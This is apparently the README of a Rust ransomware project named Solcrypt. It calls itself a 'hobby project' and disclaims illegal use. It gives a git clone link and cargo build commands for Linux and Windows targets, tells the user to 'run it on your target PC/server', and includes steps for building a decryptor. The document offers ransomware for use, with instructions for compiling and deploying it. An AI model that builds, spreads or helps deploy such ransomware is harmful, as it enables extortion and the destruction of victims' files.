# Solcrypt
A "hobby project" ransomware that isn't really meant to be used for illegal purposes.
I made this for fun, ok? Don't get me in legal trouble for it

## Setup
Arch
```
sudo pacman -S rustup
rustup default stable
rustup target add x86_64-pc-windows-msvc # if compiling against windows targets
git clone https://git.xorycode.dev/xory/solcrypt
cd solcrypt 
cargo build --release --bin solcrypt_main # linux targets
cargo build --target x86_64-pc-windows-msvc --bin solcrypt_main --release # windows targets
```
Then run it on your target PC/server

### Decryptor
Assuming you already have the source code cloned
Arch
```
cd solcrypt 
cargo build --release --bin decryptor # linux targets
cargo build --target x86_64-pc-windows-msvc --bin decryptor --release # windows targets
```
